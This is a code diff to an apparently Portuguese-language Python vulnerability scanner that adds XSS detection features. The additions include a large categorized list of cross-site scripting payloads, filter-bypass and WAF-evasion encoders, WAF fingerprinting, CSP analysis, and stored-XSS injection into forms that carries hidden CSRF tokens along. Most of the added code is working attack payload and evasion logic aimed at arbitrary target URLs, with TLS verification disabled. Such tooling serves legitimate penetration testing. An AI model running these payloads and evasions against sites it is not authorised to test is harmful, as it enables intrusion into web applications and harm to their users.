@@ -40,6 +40,21 @@ except ImportError:
     print("[!] Por favor, instale-as com: pip install -r requirements.txt")
     sys.exit(1)
 
+# Importação opcional do Selenium para DOM XSS
+try:
+    from selenium import webdriver
+    from selenium.webdriver.common.by import By
+    from selenium.webdriver.support.ui import WebDriverWait
+    from selenium.webdriver.support import expected_conditions as EC
+    from selenium.webdriver.chrome.options import Options as ChromeOptions
+    from selenium.webdriver.firefox.options import Options as FirefoxOptions
+    from selenium.webdriver.chrome.service import Service as ChromeService
+    from selenium.webdriver.firefox.service import Service as FirefoxService
+    from selenium.common.exceptions import WebDriverException, TimeoutException, NoSuchElementException
+    SELENIUM_AVAILABLE = True
+except ImportError:
+    SELENIUM_AVAILABLE = False
+
 # --- AVISO LEGAL ---
 # Este script foi criado para fins estritamente educacionais.
 # O autor não se responsabiliza pelo mau uso desta ferramenta.
@@ -1651,23 +1666,540 @@ class XSSScanner:
         self.payloads = self._load_payloads(custom_payloads_file)
         self.scan_stored = scan_stored
         self.fuzz_dom = fuzz_dom # Placeholder for future implementation
+        
+        # Configurações padrão das novas funcionalidades (podem ser sobrescritas externamente)
+        self.enable_bypasses = True
+        self.context_analysis = True
+        self.validate_execution = True
+        self.analyze_csp = True
+        self.verbose = False
 
     def _load_payloads(self, custom_payloads_file):
-        """Carrega payloads de um ficheiro ou usa um payload padrão."""
-        default_payload = "<script>alert('xss-test-spectra')</script>"
+        """Carrega payloads de um ficheiro ou usa payloads categorizados padrão."""
+        default_payloads = self._get_default_payloads()
+        
         if custom_payloads_file:
             try:
                 with open(custom_payloads_file, 'r', errors='ignore') as f:
                     payloads = [line.strip() for line in f if line.strip()]
                     if not payloads:
-                        console.print(f"[bold yellow]Aviso: O ficheiro de payloads '{custom_payloads_file}' está vazio. Usando payload padrão.[/bold yellow]")
-                        return [default_payload]
+                        console.print(f"[bold yellow]Aviso: O ficheiro de payloads '{custom_payloads_file}' está vazio. Usando payloads padrão.[/bold yellow]")
+                        return default_payloads
                     console.print(f"[*] Carregados [bold cyan]{len(payloads)}[/bold cyan] payloads de XSS de '{custom_payloads_file}'.")
                     return payloads
             except FileNotFoundError:
-                console.print(f"[bold red][!] Erro: O ficheiro de payloads '{custom_payloads_file}' não foi encontrado. Usando payload padrão.[/bold red]")
-                return [default_payload]
-        return [default_payload]
+                console.print(f"[bold red][!] Erro: O ficheiro de payloads '{custom_payloads_file}' não foi encontrado. Usando payloads padrão.[/bold red]")
+                return default_payloads
+        return default_payloads
+    
+    def _get_default_payloads(self):
+        """Retorna payloads categorizados por contexto."""
+        payloads = {
+            'html': [
+                "<script>alert('xss-test-spectra')</script>",
+                "<img src=x onerror=alert('xss-test-spectra')>",
+                "<svg onload=alert('xss-test-spectra')>",
+                "<iframe src=javascript:alert('xss-test-spectra')>",
+                "<body onload=alert('xss-test-spectra')>",
+                "<div onclick=alert('xss-test-spectra')>Click</div>",
+                "<marquee onstart=alert('xss-test-spectra')>",
+                "<video src=x onerror=alert('xss-test-spectra')>",
+                "<audio src=x onerror=alert('xss-test-spectra')>",
+                "<object data=javascript:alert('xss-test-spectra')>",
+                "<embed src=javascript:alert('xss-test-spectra')>",
+                "<base href=javascript:alert('xss-test-spectra')//>",
+                "<link rel=stylesheet href=javascript:alert('xss-test-spectra')>",
+                "<meta http-equiv=refresh content=0;url=javascript:alert('xss-test-spectra')>",
+                "<form action=javascript:alert('xss-test-spectra')><input type=submit>",
+                "<table background=javascript:alert('xss-test-spectra')>",
+                "<td background=javascript:alert('xss-test-spectra')>",
+                "<input type=image src=x onerror=alert('xss-test-spectra')>",
+                "<button onclick=alert('xss-test-spectra')>Click</button>",
+                "<select onfocus=alert('xss-test-spectra')>",
+                "<textarea onfocus=alert('xss-test-spectra')>",
+                "<keygen onfocus=alert('xss-test-spectra')>",
+                "<details open ontoggle=alert('xss-test-spectra')>",
+                "<summary onclick=alert('xss-test-spectra')>Click</summary>"
+            ],
+            'attribute': [
+                "' onmouseover=alert('xss-test-spectra') '",
+                "\" onmouseover=alert('xss-test-spectra') \"",
+                "' onfocus=alert('xss-test-spectra') '",
+                "\" onfocus=alert('xss-test-spectra') \"",
+                "' onclick=alert('xss-test-spectra') '",
+                "\" onclick=alert('xss-test-spectra') \"",
+                "' onload=alert('xss-test-spectra') '",
+                "\" onload=alert('xss-test-spectra') \"",
+                "' onerror=alert('xss-test-spectra') '",
+                "\" onerror=alert('xss-test-spectra') \"",
+                "' onblur=alert('xss-test-spectra') '",
+                "\" onblur=alert('xss-test-spectra') \"",
+                "' onchange=alert('xss-test-spectra') '",
+                "\" onchange=alert('xss-test-spectra') \"",
+                "' onkeyup=alert('xss-test-spectra') '",
+                "\" onkeyup=alert('xss-test-spectra') \"",
+                "' onkeydown=alert('xss-test-spectra') '",
+                "\" onkeydown=alert('xss-test-spectra') \"",
+                "' onsubmit=alert('xss-test-spectra') '",
+                "\" onsubmit=alert('xss-test-spectra') \"",
+                "javascript:alert('xss-test-spectra')",
+                "vbscript:alert('xss-test-spectra')",
+                "data:text/html,<script>alert('xss-test-spectra')</script>"
+            ],
+            'javascript': [
+                "';alert('xss-test-spectra');//",
+                "\";alert('xss-test-spectra');//",
+                "';alert('xss-test-spectra');var a='",
+                "\";alert('xss-test-spectra');var a=\"",
+                "\\';alert('xss-test-spectra');//",
+                "\\\";alert('xss-test-spectra');//",
+                "</script><script>alert('xss-test-spectra')</script>",
+                "/**/alert('xss-test-spectra')/**/",
+                "eval(alert('xss-test-spectra'))",
+                "Function('alert(\"xss-test-spectra\")')();",
+                "setTimeout(alert('xss-test-spectra'),0)",
+                "setInterval(alert('xss-test-spectra'),0)",
+                "window['alert']('xss-test-spectra')",
+                "parent.alert('xss-test-spectra')",
+                "top.alert('xss-test-spectra')",
+                "this.alert('xss-test-spectra')",
+                "frames.alert('xss-test-spectra')",
+                "content.alert('xss-test-spectra')",
+                "self.alert('xss-test-spectra')"
+            ],
+            'css': [
+                "expression(alert('xss-test-spectra'))",
+                "/**/expression(alert('xss-test-spectra'))",
+                "url(javascript:alert('xss-test-spectra'))",
+                "@import 'javascript:alert(\"xss-test-spectra\")'",
+                "background:url(javascript:alert('xss-test-spectra'))",
+                "background-image:url(javascript:alert('xss-test-spectra'))",
+                "list-style-image:url(javascript:alert('xss-test-spectra'))",
+                "content:url(javascript:alert('xss-test-spectra'))"
+            ],
+            'polyglot': [
+                "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert('xss-test-spectra')//'>",
+                "\"'><img src=x onerror=alert('xss-test-spectra')>",
+                "';alert('xss-test-spectra');//'><script>alert('xss-test-spectra')</script>",
+                "\"><svg/onload=alert('xss-test-spectra')>",
+                "*/alert('xss-test-spectra')/*",
+                "<!--<img src=x onerror=alert('xss-test-spectra')>-->",
+                "<![CDATA[<img src=x onerror=alert('xss-test-spectra')>]]>",
+                "<?xml version=\"1.0\"?><script>alert('xss-test-spectra')</script>",
+                "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('xss-test-spectra') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('xss-test-spectra')//\\x3e"
+            ],
+            'bypass': [
+                # Encoding bypasses
+                "%3Cscript%3Ealert('xss-test-spectra')%3C/script%3E",
+                "&#60;script&#62;alert('xss-test-spectra')&#60;/script&#62;",
+                "&lt;script&gt;alert('xss-test-spectra')&lt;/script&gt;",
+                "\\u003cscript\\u003ealert('xss-test-spectra')\\u003c/script\\u003e",
+                "\\x3Cscript\\x3Ealert('xss-test-spectra')\\x3C/script\\x3E",
+                # Case variation
+                "<ScRiPt>alert('xss-test-spectra')</ScRiPt>",
+                "<SCRIPT>alert('xss-test-spectra')</SCRIPT>",
+                "<Script>alert('xss-test-spectra')</Script>",
+                # Comment injection
+                "<scr<!---->ipt>alert('xss-test-spectra')</scr<!---->ipt>",
+                "<scr/**/ipt>alert('xss-test-spectra')</scr/**/ipt>",
+                # Null byte injection
+                "<script\\x00>alert('xss-test-spectra')</script>",
+                "<script\\x0A>alert('xss-test-spectra')</script>",
+                "<script\\x0D>alert('xss-test-spectra')</script>",
+                # Tab and newline variations
+                "<script\t>alert('xss-test-spectra')</script>",
+                "<script\n>alert('xss-test-spectra')</script>",
+                "<script\r>alert('xss-test-spectra')</script>",
+                # Double encoding
+                "%253Cscript%253Ealert('xss-test-spectra')%253C/script%253E",
+                # Unicode normalization
+                "＜script＞alert('xss-test-spectra')＜/script＞",
+                "﹤script﹥alert('xss-test-spectra')﹤/script﹥"
+            ]
+        }
+        
+        # Combina todos os payloads em uma lista plana
+        all_payloads = []
+        for category, payload_list in payloads.items():
+            all_payloads.extend(payload_list)
+        
+        return all_payloads
+    
+    def _detect_context(self, response_text, payload):
+        """Detecta o contexto onde o payload foi refletido."""
+        contexts = []
+        
+        # Verifica se está em um script tag
+        if re.search(r'<script[^>]*>.*?' + re.escape(payload) + r'.*?</script>', response_text, re.DOTALL | re.IGNORECASE):
+            contexts.append('script')
+        
+        # Verifica se está em um atributo HTML
+        attr_pattern = r'[a-zA-Z-]+\s*=\s*[\'"].*?' + re.escape(payload) + r'.*?[\'"]'
+        if re.search(attr_pattern, response_text, re.IGNORECASE):
+            contexts.append('attribute')
+        
+        # Verifica se está em um event handler
+        event_pattern = r'on[a-zA-Z]+\s*=\s*[\'"].*?' + re.escape(payload) + r'.*?[\'"]'
+        if re.search(event_pattern, response_text, re.IGNORECASE):
+            contexts.append('event_handler')
+        
+        # Verifica se está em CSS
+        css_pattern = r'<style[^>]*>.*?' + re.escape(payload) + r'.*?</style>'
+        if re.search(css_pattern, response_text, re.DOTALL | re.IGNORECASE):
+            contexts.append('css')
+        
+        # Verifica se está em URL (href, src, etc.)
+        url_pattern = r'(?:href|src|action|formaction)\s*=\s*[\'"].*?' + re.escape(payload) + r'.*?[\'"]'
+        if re.search(url_pattern, response_text, re.IGNORECASE):
+            contexts.append('url')
+        
+        # Verifica se está em texto HTML normal
+        if payload in response_text and not contexts:
+            contexts.append('html_text')
+        
+        return contexts
+    
+    def _get_context_specific_payloads(self, contexts):
+        """Retorna payloads específicos para os contextos detectados."""
+        payload_map = {
+            'html_text': [
+                "<script>alert('xss-context-html')</script>",
+                "<img src=x onerror=alert('xss-context-html')>",
+                "<svg onload=alert('xss-context-html')>",
+                "<!--<script>alert('xss-context-html')</script>-->"
+            ],
+            'attribute': [
+                "\" onmouseover=alert('xss-context-attr') \"",
+                "' onmouseover=alert('xss-context-attr') '",
+                "\" autofocus onfocus=alert('xss-context-attr') \"",
+                "' autofocus onfocus=alert('xss-context-attr') '",
+                "javascript:alert('xss-context-attr')"
+            ],
+            'script': [
+                "';alert('xss-context-script');//",
+                "\";alert('xss-context-script');//",
+                "*/alert('xss-context-script')/*",
+                "</script><script>alert('xss-context-script')</script>",
+                "\\';alert('xss-context-script');//"
+            ],
+            'event_handler': [
+                "alert('xss-context-event')",
+                "javascript:alert('xss-context-event')",
+                "eval(alert('xss-context-event'))"
+            ],
+            'css': [
+                "expression(alert('xss-context-css'))",
+                "url(javascript:alert('xss-context-css'))",
+                "/**/expression(alert('xss-context-css'))"
+            ],
+            'url': [
+                "javascript:alert('xss-context-url')",
+                "data:text/html,<script>alert('xss-context-url')</script>",
+                "vbscript:alert('xss-context-url')"
+            ]
+        }
+        
+        context_payloads = []
+        for context in contexts:
+            if context in payload_map:
+                context_payloads.extend(payload_map[context])
+        
+        return context_payloads if context_payloads else payload_map['html_text']
+    
+    def _analyze_csp(self, response):
+        """Analisa Content Security Policy se presente."""
+        csp_header = response.headers.get('Content-Security-Policy', '')
+        if not csp_header:
+            csp_header = response.headers.get('Content-Security-Policy-Report-Only', '')
+        
+        if csp_header:
+            csp_info = {
+                'present': True,
+                'header': csp_header,
+                'allows_inline_script': "'unsafe-inline'" in csp_header or 'script-src' not in csp_header,
+                'allows_eval': "'unsafe-eval'" in csp_header,
+                'allows_data_uri': 'data:' in csp_header,
+                'report_only': 'Content-Security-Policy-Report-Only' in response.headers
+            }
+            return csp_info
+        
+        return {'present': False}
+    
+    def _apply_encoding_bypass(self, payload):
+        """Aplica diferentes técnicas de encoding para bypass de filtros."""
+        bypass_variants = []
+        
+        # URL encoding
+        import urllib.parse
+        bypass_variants.append(urllib.parse.quote(payload))
+        bypass_variants.append(urllib.parse.quote(payload, safe=''))
+        
+        # Double URL encoding
+        double_encoded = urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')
+        bypass_variants.append(double_encoded)
+        
+        # HTML entity encoding
+        html_encoded = ''.join(f'&#{ord(c)};' for c in payload)
+        bypass_variants.append(html_encoded)
+        
+        # Hex encoding
+        hex_encoded = ''.join(f'\\x{ord(c):02x}' for c in payload)
+        bypass_variants.append(hex_encoded)
+        
+        # Unicode encoding
+        unicode_encoded = ''.join(f'\\u{ord(c):04x}' for c in payload)
+        bypass_variants.append(unicode_encoded)
+        
+        # Mixed case (para tags HTML)
+        if '<' in payload and '>' in payload:
+            mixed_case = ''
+            for char in payload:
+                if char.isalpha():
+                    mixed_case += char.upper() if len(mixed_case) % 2 == 0 else char.lower()
+                else:
+                    mixed_case += char
+            bypass_variants.append(mixed_case)
+        
+        return bypass_variants
+    
+    def _apply_waf_evasion(self, payload):
+        """Aplica técnicas de evasão de WAF."""
+        evasion_variants = []
+        
+        # Comment injection
+        if '<script>' in payload.lower():
+            evasion_variants.append(payload.replace('<script>', '<scr<!---->ipt>').replace('</script>', '</scr<!---->ipt>'))
+            evasion_variants.append(payload.replace('<script>', '<scr/**/ipt>').replace('</script>', '</scr/**/ipt>'))
+        
+        # Null byte injection
+        evasion_variants.append(payload.replace('<', '<\\x00').replace('>', '\\x00>'))
+        
+        # Tab and newline injection
+        evasion_variants.append(payload.replace('<script>', '<script\\t>'))
+        evasion_variants.append(payload.replace('<script>', '<script\\n>'))
+        evasion_variants.append(payload.replace('<script>', '<script\\r>'))
+        
+        # Alternative quotes
+        if "'" in payload:
+            evasion_variants.append(payload.replace("'", '"'))
+            evasion_variants.append(payload.replace("'", '`'))
+        
+        # Whitespace variations
+        evasion_variants.append(payload.replace(' ', '\\t'))
+        evasion_variants.append(payload.replace(' ', '\\n'))
+        evasion_variants.append(payload.replace(' ', '/'))
+        
+        # Alternative event handlers
+        if 'onerror' in payload.lower():
+            evasion_variants.append(payload.replace('onerror', 'onload'))
+            evasion_variants.append(payload.replace('onerror', 'onfocus'))
+            evasion_variants.append(payload.replace('onerror', 'onmouseover'))
+        
+        # Protocol variations
+        if 'javascript:' in payload.lower():
+            evasion_variants.append(payload.replace('javascript:', 'data:text/html,'))
+            evasion_variants.append(payload.replace('javascript:', 'vbscript:'))
+        
+        return evasion_variants
+    
+    def _detect_waf(self, response):
+        """Detecta possível presença de WAF baseado em headers e conteúdo."""
+        waf_indicators = {
+            'cloudflare': ['cf-ray', 'cloudflare', '__cfduid'],
+            'akamai': ['akamai', 'ak-bmsc'],
+            'aws_waf': ['awselb', 'awsalb'],
+            'incapsula': ['incap_ses', 'incapsula'],
+            'sucuri': ['sucuri', 'x-sucuri'],
+            'barracuda': ['barracuda', 'barra'],
+            'f5_bigip': ['bigip', 'f5-'],
+            'fortinet': ['fortigate', 'fortiweb'],
+            'generic': ['blocked', 'forbidden', 'suspicious', 'malicious', 'attack']
+        }
+        
+        detected_wafs = []
+        headers_text = ' '.join([f"{k}: {v}" for k, v in response.headers.items()]).lower()
+        content_text = response.text.lower()
+        
+        for waf_name, indicators in waf_indicators.items():
+            for indicator in indicators:
+                if indicator in headers_text or indicator in content_text:
+                    detected_wafs.append(waf_name)
+                    break
+        
+        return detected_wafs
+    
+    def _test_with_bypasses(self, url, param, base_payload, method, form_data=None):
+        """Testa um payload com várias técnicas de bypass."""
+        successful_bypasses = []
+        
+        # Testa o payload original primeiro
+        try:
+            test_data = {param: base_payload}
+            if method.lower() == 'get':
+                response = self.session.get(url, params=test_data, timeout=7, verify=False)
+            else:
+                post_payload = (form_data or {}).copy()
+                post_payload[param] = base_payload
+                response = self.session.post(url, data=post_payload, timeout=7, verify=False)
+            
+            # Detecta WAF
+            detected_wafs = self._detect_waf(response)
+            
+            if base_payload in response.text:
+                return [{'payload': base_payload, 'technique': 'original', 'waf_detected': detected_wafs}]
+            
+            # Se o payload original não funcionou, tenta bypasses
+            encoding_variants = self._apply_encoding_bypass(base_payload)
+            waf_evasion_variants = self._apply_waf_evasion(base_payload)
+            
+            all_variants = encoding_variants + waf_evasion_variants
+            
+            for variant in all_variants[:15]:  # Limita para performance
+                test_data = {param: variant}
+                try:
+                    if method.lower() == 'get':
+                        response = self.session.get(url, params=test_data, timeout=7, verify=False)
+                    else:
+                        post_payload = (form_data or {}).copy()
+                        post_payload[param] = variant
+                        response = self.session.post(url, data=post_payload, timeout=7, verify=False)
+                    
+                    if variant in response.text or base_payload in response.text:
+                        technique = 'encoding' if variant in encoding_variants else 'waf_evasion'
+                        successful_bypasses.append({
+                            'payload': variant,
+                            'technique': technique,
+                            'waf_detected': detected_wafs
+                        })
+                        break  # Para na primeira técnica bem-sucedida
+                        
+                except requests.RequestException:
+                    continue
+                    
+        except requests.RequestException:
+            pass
+        
+        return successful_bypasses
+    
+    def _validate_javascript_execution(self, url, param, payload, method, form_data=None):
+        """Valida se o JavaScript pode ser executado usando técnicas de análise de resposta."""
+        validation_results = {
+            'likely_executable': False,
+            'confidence': 'low',
+            'indicators': [],
+            'response_changes': []
+        }
+        
+        # Payloads de validação específicos
+        validation_payloads = [
+            # Payload que altera o título da página
+            payload.replace("alert('xss-test-spectra')", "document.title='XSS-VALIDATION-SPECTRA'"),
+            # Payload que adiciona elemento ao DOM
+            payload.replace("alert('xss-test-spectra')", "document.body.innerHTML+='<div id=\"xss-validation-spectra\">XSS</div>'"),
+            # Payload que executa callback
+            payload.replace("alert('xss-test-spectra')", "fetch('/xss-callback-validation').catch(()=>{})"),
+            # Payload que modifica URL
+            payload.replace("alert('xss-test-spectra')", "window.location.hash='xss-validation'"),
+        ]
+        
+        for validation_payload in validation_payloads:
+            try:
+                test_data = {param: validation_payload}
+                if method.lower() == 'get':
+                    response = self.session.get(url, params=test_data, timeout=7, verify=False)
+                else:
+                    post_payload = (form_data or {}).copy()
+                    post_payload[param] = validation_payload
+                    response = self.session.post(url, data=post_payload, timeout=7, verify=False)
+                
+                # Verifica indicadores de execução
+                if 'XSS-VALIDATION-SPECTRA' in response.text:
+                    validation_results['indicators'].append('title_change')
+                    validation_results['likely_executable'] = True
+                    validation_results['confidence'] = 'high'
+                
+                if 'xss-validation-spectra' in response.text.lower():
+                    validation_results['indicators'].append('dom_modification')
+                    validation_results['likely_executable'] = True
+                    validation_results['confidence'] = 'medium'
+                
+                # Verifica mudanças na estrutura HTML
+                if validation_payload in response.text:
+                    # Analisa se o payload está em posição executável
+                    soup = BeautifulSoup(response.text, 'html.parser')
+                    scripts = soup.find_all('script')
+                    for script in scripts:
+                        if validation_payload in str(script):
+                            validation_results['indicators'].append('script_context')
+                            validation_results['likely_executable'] = True
+                            validation_results['confidence'] = 'high'
+                            break
+                    
+                    # Verifica event handlers
+                    for tag in soup.find_all(attrs=True):
+                        for attr, value in tag.attrs.items():
+                            if attr.startswith('on') and validation_payload in str(value):
+                                validation_results['indicators'].append('event_handler')
+                                validation_results['likely_executable'] = True
+                                validation_results['confidence'] = 'high'
+                                break
+                
+                # Analisa Content-Type
+                content_type = response.headers.get('Content-Type', '').lower()
+                if 'text/html' in content_type or 'application/xhtml' in content_type:
+                    validation_results['indicators'].append('html_content_type')
+                elif 'application/json' in content_type:
+                    validation_results['confidence'] = 'low'  # JSON XSS é mais difícil
+                
+                break  # Para no primeiro payload que reflete
+                
+            except requests.RequestException:
+                continue
+        
+        return validation_results
+    
+    def _improve_form_analysis(self, form):
+        """Analisa formulários de forma mais detalhada."""
+        form_info = {
+            'action': form.get('action', ''),
+            'method': form.get('method', 'get').lower(),
+            'fields': [],
+            'hidden_fields': [],
+            'csrf_tokens': [],
+            'file_uploads': False,
+            'ajax_likely': False
+        }
+        
+        # Analisa todos os campos
+        for field in form.find_all(['input', 'textarea', 'select']):
+            field_info = {
+                'name': field.get('name', ''),
+                'type': field.get('type', 'text'),
+                'value': field.get('value', ''),
+                'required': field.has_attr('required'),
+                'readonly': field.has_attr('readonly'),
+                'disabled': field.has_attr('disabled')
+            }
+            
+            if field_info['type'] == 'hidden':
+                form_info['hidden_fields'].append(field_info)
+                # Detecta possíveis tokens CSRF
+                if any(csrf_name in field_info['name'].lower() for csrf_name in ['csrf', 'token', '_token', 'authenticity']):
+                    form_info['csrf_tokens'].append(field_info)
+            elif field_info['type'] == 'file':
+                form_info['file_uploads'] = True
+            else:
+                form_info['fields'].append(field_info)
+        
+        # Detecta possível AJAX baseado em atributos
+        if form.get('data-remote') or form.get('data-ajax') or 'ajax' in str(form.get('class', '')).lower():
+            form_info['ajax_likely'] = True
+        
+        # Analisa JavaScript inline no formulário
+        if form.get('onsubmit') or form.find('script'):
+            form_info['ajax_likely'] = True
+        
+        return form_info
 
     def _add_finding(self, risk, v_type, detail, recommendation):
         """Adiciona ou atualiza uma descoberta, priorizando XSS Armazenado."""
@@ -1687,56 +2219,194 @@ class XSSScanner:
         self.vulnerable_points.append({"Risco": risk, "Tipo": v_type, "Detalhe": detail, "Recomendação": recommendation})
 
     def _scan_reflected(self, tasks, progress):
-        """Executa o scan para XSS Refletido."""
+        """Executa o scan para XSS Refletido com detecção context-aware."""
         task_id = progress.add_task("[green]Testando XSS Refletido...", total=len(tasks))
         for method, url, param, form_data in tasks:
             progress.update(task_id, advance=1, description=f"[green]Testando [cyan]{param}[/cyan] (Refletido)...")
-            for payload in self.payloads:
-                test_data = {param: payload}
-                try:
-                    if method.lower() == 'get':
-                        response = self.session.get(url, params=test_data, timeout=7, verify=False)
-                    else: # POST
-                        post_payload = (form_data or {}).copy()
-                        post_payload[param] = payload
-                        response = self.session.post(url, data=post_payload, timeout=7, verify=False)
+            
+            # Primeiro, testa com um payload simples para detectar contexto
+            test_payload = "xss-context-test-12345"
+            test_data = {param: test_payload}
+            context_detected = False
+            
+            try:
+                if method.lower() == 'get':
+                    response = self.session.get(url, params=test_data, timeout=7, verify=False)
+                else: # POST
+                    post_payload = (form_data or {}).copy()
+                    post_payload[param] = test_payload
+                    response = self.session.post(url, data=post_payload, timeout=7, verify=False)
 
-                    if payload in response.text:
-                        detail = f"Parâmetro '{param}' em {url} ({method.upper()})"
-                        rec = f"Payload '{payload}' foi refletido sem sanitização."
-                        self._add_finding("Médio", "XSS Refletido", detail, rec)
-                        break  # Encontrado um payload funcional, passa para o próximo parâmetro
-                except requests.RequestException:
-                    pass
+                # Analisa CSP
+                csp_info = self._analyze_csp(response)
+                
+                if test_payload in response.text:
+                    # Detecta contexto onde o payload foi refletido
+                    contexts = self._detect_context(response.text, test_payload)
+                    
+                    if contexts:
+                        context_detected = True
+                        context_payloads = self._get_context_specific_payloads(contexts)
+                        
+                        # Testa payloads específicos para o contexto detectado
+                        for context_payload in context_payloads:
+                            test_data_context = {param: context_payload}
+                            try:
+                                if method.lower() == 'get':
+                                    context_response = self.session.get(url, params=test_data_context, timeout=7, verify=False)
+                                else:
+                                    post_payload_context = (form_data or {}).copy()
+                                    post_payload_context[param] = context_payload
+                                    context_response = self.session.post(url, data=post_payload_context, timeout=7, verify=False)
+                                
+                                if context_payload in context_response.text:
+                                    detail = f"Parâmetro '{param}' em {url} ({method.upper()})"
+                                    context_str = ', '.join(contexts)
+                                    csp_warning = ""
+                                    if csp_info['present']:
+                                        if csp_info['report_only']:
+                                            csp_warning = " (CSP em modo Report-Only)"
+                                        elif csp_info['allows_inline_script']:
+                                            csp_warning = " (CSP permite scripts inline)"
+                                        else:
+                                            csp_warning = " (CSP presente mas pode ter bypass)"
+                                    
+                                    rec = f"Payload '{context_payload}' foi refletido no contexto: {context_str}{csp_warning}. Validar execução manual."
+                                    
+                                    # Ajusta o risco baseado no contexto e CSP
+                                    risk = "Alto" if any(ctx in ['script', 'event_handler', 'html_text'] for ctx in contexts) else "Médio"
+                                    if csp_info['present'] and not csp_info['allows_inline_script'] and not csp_info['report_only']:
+                                        risk = "Médio"  # Reduz o risco se CSP está ativo
+                                    
+                                    self._add_finding(risk, "XSS Refletido", detail, rec)
+                                    break
+                            except requests.RequestException:
+                                continue
+                        
+                        if context_detected:
+                            break  # Passou para o próximo parâmetro se encontrou um contexto
+                
+                # Se não detectou contexto específico, testa com payloads gerais e bypasses
+                if not context_detected:
+                    for payload in self.payloads[:5]:  # Reduz para 5 payloads base
+                        # Primeiro testa o payload normal
+                        test_data = {param: payload}
+                        try:
+                            if method.lower() == 'get':
+                                response = self.session.get(url, params=test_data, timeout=7, verify=False)
+                            else:
+                                post_payload = (form_data or {}).copy()
+                                post_payload[param] = payload
+                                response = self.session.post(url, data=post_payload, timeout=7, verify=False)
+
+                            if payload in response.text:
+                                detail = f"Parâmetro '{param}' em {url} ({method.upper()})"
+                                rec = f"Payload '{payload}' foi refletido sem sanitização."
+                                self._add_finding("Médio", "XSS Refletido", detail, rec)
+                                break
+                            
+                            # Se o payload normal não funcionou, testa com bypasses
+                            bypass_results = self._test_with_bypasses(url, param, payload, method, form_data)
+                            if bypass_results:
+                                result = bypass_results[0]
+                                detail = f"Parâmetro '{param}' em {url} ({method.upper()})"
+                                waf_info = f" (WAF detectado: {', '.join(result['waf_detected'])})" if result['waf_detected'] else ""
+                                rec = f"Payload '{result['payload']}' contornou filtros usando técnica: {result['technique']}{waf_info}."
+                                risk = "Alto" if result['technique'] in ['original', 'waf_evasion'] else "Médio"
+                                self._add_finding(risk, "XSS Refletido", detail, rec)
+                                break
+                                
+                        except requests.RequestException:
+                            continue
+                            
+            except requests.RequestException:
+                pass
         progress.remove_task(task_id)
 
     def _inject_into_forms(self, forms, progress):
-        """Submete payloads em todos os formulários encontrados."""
-        num_fields = sum(len(form.find_all(['input', 'textarea'], {'name': True})) for form in forms)
-        if num_fields == 0:
+        """Submete payloads em todos os formulários encontrados com análise aprimorada."""
+        total_fields = 0
+        analyzed_forms = []
+        
+        # Analisa todos os formulários primeiro
+        for form in forms:
+            form_info = self._improve_form_analysis(form)
+            if form_info['fields']:  # Só processa se tem campos testáveis
+                analyzed_forms.append((form, form_info))
+                total_fields += len(form_info['fields'])
+        
+        if total_fields == 0:
             return
             
-        submission_task = progress.add_task("[green]Submetendo payloads (Stored XSS)...", total=num_fields * len(self.payloads))
-        for form in forms:
-            action = urljoin(self.base_url, form.get('action', ''))
-            method = form.get('method', 'post').lower()
+        submission_task = progress.add_task("[green]Submetendo payloads (Stored XSS)...", total=total_fields * len(self.payloads[:10]))
+        
+        for form, form_info in analyzed_forms:
+            action = urljoin(self.base_url, form_info['action']) if form_info['action'] else self.base_url
+            method = form_info['method']
+            
             if method != 'post':
-                progress.update(submission_task, advance=len(self.payloads) * len(form.find_all(['input', 'textarea'], {'name': True})))
+                progress.update(submission_task, advance=len(self.payloads[:10]) * len(form_info['fields']))
                 continue
 
-            form_fields = [i.get('name') for i in form.find_all(['input', 'textarea'], {'name': True})]
+            # Prepara dados base do formulário
+            base_data = {}
             
-            for field in form_fields:
-                for payload in self.payloads:
-                    progress.update(submission_task, advance=1)
-                    # Cria um payload base com valores de teste para todos os campos
-                    base_data = {f: 'test' for f in form_fields}
-                    # Substitui o campo atual pelo payload
-                    base_data[field] = payload
+            # Inclui campos hidden (incluindo CSRFs)
+            for hidden_field in form_info['hidden_fields']:
+                if hidden_field['name']:
+                    base_data[hidden_field['name']] = hidden_field['value']
+            
+            # Valores padrão para campos normais
+            for field_info in form_info['fields']:
+                if field_info['name'] and not field_info['disabled'] and not field_info['readonly']:
+                    if field_info['type'] == 'email':
+                        base_data[field_info['name']] = 'test@example.com'
+                    elif field_info['type'] == 'number':
+                        base_data[field_info['name']] = '123'
+                    elif field_info['type'] == 'url':
+                        base_data[field_info['name']] = 'http://example.com'
+                    else:
+                        base_data[field_info['name']] = 'test'
+            
+            # Testa cada campo com payloads
+            for field_info in form_info['fields']:
+                if not field_info['name'] or field_info['disabled'] or field_info['readonly']:
+                    continue
+                
+                field_name = field_info['name']
+                
+                # Seleciona payloads apropriados baseado no tipo de campo
+                if field_info['type'] in ['email', 'url']:
+                    # Para campos de email/URL, usa payloads específicos
+                    test_payloads = [
+                        "test+<script>alert('xss')</script>@example.com",
+                        "http://example.com/<script>alert('xss')</script>",
+                        "javascript:alert('xss')"
+                    ]
+                else:
+                    test_payloads = self.payloads[:10]  # Limita para performance
+                
+                for payload in test_payloads:
+                    progress.update(submission_task, advance=1, description=f"[green]Testando campo [cyan]{field_name}[/cyan]...")
+                    
+                    # Cria dados de teste
+                    test_data = base_data.copy()
+                    test_data[field_name] = payload
+                    
                     try:
-                        self.session.post(action, data=base_data, timeout=7, verify=False)
+                        if form_info['ajax_likely']:
+                            # Para formulários AJAX, adiciona headers apropriados
+                            headers = {
+                                'X-Requested-With': 'XMLHttpRequest',
+                                'Content-Type': 'application/x-www-form-urlencoded'
+                            }
+                            self.session.post(action, data=test_data, headers=headers, timeout=7, verify=False)
+                        else:
+                            self.session.post(action, data=test_data, timeout=7, verify=False)
+                            
                     except requests.RequestException:
                         continue
+        
         progress.remove_task(submission_task)
 
     def _verify_storage(self, progress):
@@ -1857,8 +2527,14 @@ class XSSScanner:
             console.print(table)
         console.print("-" * 60)
 
-def xss_scan(url, custom_payloads_file=None, scan_stored=False, fuzz_dom=False):
-    XSSScanner(url, custom_payloads_file=custom_payloads_file, scan_stored=scan_stored, fuzz_dom=fuzz_dom).run_scan()
